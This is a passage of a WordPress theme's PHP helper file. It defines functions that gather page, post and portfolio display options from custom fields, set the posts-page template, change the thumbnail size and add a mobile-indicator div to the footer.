			$item_output .= '</a>';
			$item_output .= $args->after;

			/**
			 * Filter a menu item's starting output.
			 *
			 * The menu item's starting output only includes `$args->before`, the opening `<a>`,
			 * the menu item's title, the closing `</a>`, and `$args->after`. Currently, there is
			 * no filter for modifying the opening and closing `<li>` for a menu item.
			 *
			 * @since 3.0.0
			 *
			 * @param string $item_output The menu item's starting HTML output.
			 * @param object $item Menu item data object.
			 * @param int $depth Depth of menu item. Used for padding.
			 * @param array $args An array of {@see wp_nav_menu()} arguments.
			 */
			$output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
		}
	}
endif;


/**
 * Gets all selected options for the page
 * Declared in functions.php
 *
 * @since  1.0
 */
if ( ! function_exists( 'tw_get_page_options' ) ) :
	function tw_get_page_options( $args = '' ) {

		global $post;
		global $fields_installed;
		global $tw_options;

		/**
		 * Define the array of defaults
		 */
		$defaults = array(
			'pageID'         => is_home() ? get_option( 'page_for_posts' ) : $post->ID, // page ID
			'classes'        => '', // page classes
			'loop_template'  => 'posts', // posts to get
			'display'        => 'minimal', // custom template display
			'posts_per_page' => true, // use custom posts per page
			'title_options'  => true, // get title options like opacity, color, alignment
			'display_title'  => true, // display the title or not
			'filters'        => null, // custom display filters
			'alignment'      => 'align-left',  // set default alignment
			'custom_tax'     => false // custom taxonomy
		);

		/**
		 * Parse incoming $args into an array and merge it with $defaults
		 */
		$args = wp_parse_args( $args, $defaults );

		/**
		 * Transfer to output variable
		 */
		$page = $args;

		// check if taxonomy
		$is_taxonomy    = is_category() || is_tag() || is_tax();
		$queried_object = $is_taxonomy ? get_queried_object() : false;
		$custom_tax     = $fields_installed && get_field( 'custom_template', $queried_object ) == 'custom' ? true : false;

		/**
		 * Special taxonomy page options
		 */
		if ( $is_taxonomy && $custom_tax ) {
			$args['pageID']        = $queried_object;
			$page['pageID']        = $queried_object;
			$args['title_options'] = false;

			$display         = $fields_installed ? get_field( 'post_layout', $args['pageID'] ) : $args['display'];
			$page['display'] = esc_attr( $display );
		}

		/**
		 * Posts Per Page
		 */
		$posts_per_page = $fields_installed ? get_field( 'posts_number', $args['pageID'] ) : false;
		if ( $args['posts_per_page'] && $posts_per_page ) {
			$page['posts_per_page'] = $posts_per_page;
		} else {
			$page['posts_per_page'] = false;
		}
		// overwrite if blog page
		if ( is_home() && get_page_template_slug( $args['pageID'] ) == '' ) {
			$page['posts_per_page'] = false;
		}

		/**
		 * Page Alignment
		 */
		$alignment = $fields_installed ? get_field( 'alignment', $args['pageID'] ) : false;
		if ( $alignment ) {
			$page['alignment'] = 'align-' . $alignment;
		} else {
			$page['alignment'] = 'align-left';
		}
		$page['classes'][] = sanitize_html_class( 'page-' . $page['alignment'] ); // set page alignement


		/**
		 * Get filters option
		 */
		if ( $is_taxonomy && $custom_tax ) {
			$filter          = $fields_installed ? get_field( 'filter', $args['pageID'] ) : false;
			$page['filters'] = $filter ? esc_html( $filter ) : false;
		} else {
			if ( $args['filters'] === null ) { // if custom filters are specified
				$filter          = $fields_installed ? get_field( 'filter', $args['pageID'] ) : false;
				$page['filters'] = $filter ? esc_html( $filter ) : false;
			}
		}
		// overwrite if using default template and the blog page
		if ( is_home() && get_page_template_slug( $args['pageID'] ) == '' ) {
			$page['filters'] = false;
		}

		/**
		 * Get featured image
		 */
		if ( $is_taxonomy && $custom_tax ) {
			$featured = $fields_installed ? get_field( 'background_image', $args['pageID'] ) : false;
			if ( $featured ) {
				$page['featured_image'] = $featured;
			} else {
				$page['featured_image'] = false;
			}
		} else {
			$featured = wp_get_attachment_image_src( get_post_thumbnail_id( $args['pageID'] ), 'fullslideshownc' );
			if ( isset( $featured[0] ) ) {
				$page['featured_image'] = $featured[0];
			} else {
				$page['featured_image'] = false;
			}
		}

		/**
		 * General Title Options
		 */
		$page['title-alignment'] = $fields_installed && get_field( 'title_alignment', $args['pageID'] ) ? get_field( 'title_alignment', $args['pageID'] ) . '-title' : 'left-title';
		$page['classes'][]       = $page['title-alignment'];

		/**
		 * If we should get title options
		 */
		if ( $args['title_options'] ) {

			// if title display option is set
			if ( $fields_installed ) {
				$page['display_title'] = get_field( 'display_title', $args['pageID'] );
			}

			// Get title opacity stuff
			$page['opacity_styles'] = array(
				'background-color' => $fields_installed ? get_field( 'title_area_background_color', $args['pageID'] ) : false,
				'opacity'          => $fields_installed ? get_field( 'title_area_background_color_opacity', $args['pageID'] ) / 100 : false
			);

			// Page Classes
			$page['classes'][] = $fields_installed && get_field( 'title_area_text_color', $args['pageID'] ) == 'white' ? 'title-white dark-section' : false;

		} else {

			// If there's a featured image, do a white text and an opacity
			if ( $page['featured_image'] ) {
				$page['classes'][]      = 'title-white dark-section';
				$page['opacity_styles'] = array( 'background-color' => '#000', 'opacity' => '0.3' );
			} else {
				$page['classes'][]      = 'title-black';
				$page['opacity_styles'] = array( 'background-color' => '#000', 'opacity' => '0' );
			}

		}

		/**
		 * Grid Specific Options
		 */

		// grid crop
		$crop = $fields_installed ? get_field( 'crop', $args['pageID'] ) : false;
		if ( $crop ) {
			$page['grid']['crop'] = 'grid';
		} else {
			$page['grid']['crop'] = 'gridnc';
		}

		// grid columns
		$columns = $fields_installed ? get_field( 'columns', $args['pageID'] ) : false;
		if ( $columns ) {
			$page['grid']['columns'] = $columns;
		} else {
			$page['grid']['columns'] = 3;
		}

		/**
		 * General Page Classes
		 */
		$page['classes'][] = 'page-content-wrapper'; // generic page class
		$page['classes'][] = isset( $field_object ) && $field_object ? 'has-sections' : 'no-sections'; // has sections class
		$page['classes'][] = $page['featured_image'] ? 'has-image' : false; // featured image class
		$page['classes'][] = 'template-' . $page['display']; // template display
		$page['classes'][] = $page['filters'] ? 'filters-enabled' : 'no-filters'; // filter display

		// return variable
		// we'll escape this array on output
		return $page;
	}
endif;

/**
 * Gets all selected options for the page
 * Declared in functions.php
 *
 * @since  1.0
 *
 * @param array $args
 *
 * @return array
 */
if ( ! function_exists( 'tw_get_post_options' ) ) :
	function tw_get_post_options( $args = array() ) {

		global $post;
		global $fields_installed;

		/**
		 * Define the array of defaults
		 */
		$defaults = array(
			'sections'       => false,
			'pageID'         => $post->ID,    // page ID
			'classes'        => array(), // page classes
			'loop_template'  => 'posts', // posts to get
			'display_title'  => true, // display the title or not
			'intro'          => false, // intro
			'featured_image' => false, // featured image
		);

		/**
		 * Parse incoming $args into an array and merge it with $defaults
		 */
		$page = wp_parse_args( $args, $defaults );

		/**
		 * Intro Text
		 */
		if ( $fields_installed && get_field( 'intro_text' ) ) {
			$page['intro'] = get_field( 'intro_text' );
		}

		/**
		 * Get featured image
		 */
		$featured = wp_get_attachment_image_src( get_post_thumbnail_id( $page['pageID'] ), 'fullslideshownc' );
		if ( isset( $featured[0] ) ) {
			$page['featured_image'] = $featured[0];
		}

		/**
		 * General Page Classes
		 */
		$page['classes'][] = $page['sections'] ? 'has-sections' : 'no-sections'; // has sections class
		$page['classes'][] = $page['featured_image'] ? 'has-image' : false; // featured image class
		$page['classes'][] = has_tag() ? 'has-tags' : 'no-tags'; // has tags
		$page['classes'][] = 'page-content-wrapper'; // necessary identification class

		/**
		 * Featured image and title options
		 */
		if ( $page['featured_image'] ) {
			$page['classes'][]      = 'title-white dark-section';
			$page['opacity_styles'] = array( 'background-color' => '#000', 'opacity' => '0.3' );
		} else {
			$page['classes'][]      = 'title-black';
			$page['opacity_styles'] = array( 'background-color' => '#000', 'opacity' => '0' );
		}

		// convert classes to string
		$page['classes'] = implode( ' ', $page['classes'] );

		// return variable
		return $page;
	}
endif;

/**
 * Gets all options for single portfolio pages
 *
 * @since 1.0
 *
 * @param array $args
 *
 * @return array
 */
if ( ! function_exists( 'tw_get_portfolio_options' ) ) :
	function tw_get_portfolio_options( $args = array() ) {

		/**
		 * global variables
		 */
		global $post;
		global $fields_installed;

		/**
		 * Define the array of defaults
		 */
		$defaults = array(
			'pageID'         => $post->ID,
			'has_content'    => false, // has content
			'show_title'     => true, // show title
			'show_content'   => false, // show the portfolio content
			'classes'        => array('has-title'), // portfolio classes
			'featured_image' => false, // featured image
			'intro'          => false, // intro text
			'opacity_styles' => false // opacity styles
		);

		/**
		 * Parse incoming $args into an array and merge it with $defaults
		 */
		$portfolio = wp_parse_args( $args, $defaults );

		/**
		 * get flags
		 */
		// portfolio has content
		if ( get_the_content() ) {
			$portfolio['has_content'] = true;
		}

		// show/hide title option
		if ( $fields_installed && get_field( 'show_title' ) == false ) {
			$portfolio['show_title'] = false;
			$portfolio['classes'][]  = 'no-title';
		}

		// get featured image area stuff
		if ( $fields_installed && get_field( 'background_image' ) ) {
			$portfolio['featured_image'] = get_field( 'background_image' );
		}

		// get intro text
		if ( $fields_installed && get_field( 'intro_text' ) ) {
			$portfolio['intro'] = get_field( 'intro_text' );
		}

		// show portfolio content
		if ( $portfolio['has_content'] || $portfolio['intro'] || $portfolio['show_title'] ) {
			$portfolio['show_content'] = true;
		}

		// set title opacity stuff
		$portfolio['opacity_styles'] = array(
			'background-color' => '#000000',
			'opacity'          => '0.3'
		);

		// classes
		$portfolio['classes'][] = 'page-content-wrapper center-title no-tags';
		$portfolio['classes'][] = $portfolio['featured_image'] ? 'title-white dark-section has-image' : 'no-image';
		$portfolio['classes'][] = have_rows( 'sections', $post->ID ) ? 'has-sections' : 'no-sections';

		return $portfolio;
	}
endif;

/**
 * Allows WordPress to use the custom template of the page which
 * is set within the 'Posts page:' setting of the 'Reading' options.
 *
 * @param $template template to use
 *
 * @return string
 */
if ( ! function_exists( 'tw_posts_page_custom_template' ) ) :
	function tw_posts_page_custom_template( $template ) {
		global $wp_query;
		//	find if a page_for_posts have been set.
		if ( true == ( $posts_per_page_id = get_option( 'page_for_posts' ) ) ) {
			//	get the current page id.
			$page_id = $wp_query->get_queried_object_id();
			//	if the same page, get the correct template.
			if ( $page_id == $posts_per_page_id ) {
				//	get the current theme directory.
				$theme_directory = get_stylesheet_directory() . "/";
				//	get the page template
				$page_template = get_post_meta( $page_id, '_wp_page_template', true );
				//	by-pass the default template, allow wordpress to handle the fallback template.
				if ( $page_template != 'default' ) {
					//	find the template in the parent if the template is not a child template
					if ( is_child_theme() && ! file_exists( $theme_directory . $page_template ) ) {
						//	set to parent template directory
						$theme_directory = get_template_directory();
					}

					return $theme_directory . $page_template;
				}
			}
		}

		return $template;
	}

	add_filter( 'template_include', 'tw_posts_page_custom_template' );
endif;

/**
 * Changes posts shortcode thumbnail size
 *
 * @return string
 *
 * @since 1.0
 */
if ( ! function_exists( 'tw_change_posts_thumbnail_size' ) ) :
	function tw_change_posts_thumbnail_size(){
		return 'grid';
	}
	add_filter( 'tw_posts_shortcode_thumb_size', 'tw_change_posts_thumbnail_size' );
endif;

/**
 * Utility div to detect media queries with javascript
 *
 * @echo string
 *
 * @since 1.0
 */
if ( ! function_exists( 'tw_mobile_indicator' ) ) :
	function tw_mobile_indicator() {
		echo '<div id="tw-mobile-indicator"></div>';
	}
	add_filter( 'wp_footer', 'tw_mobile_indicator' );
endif;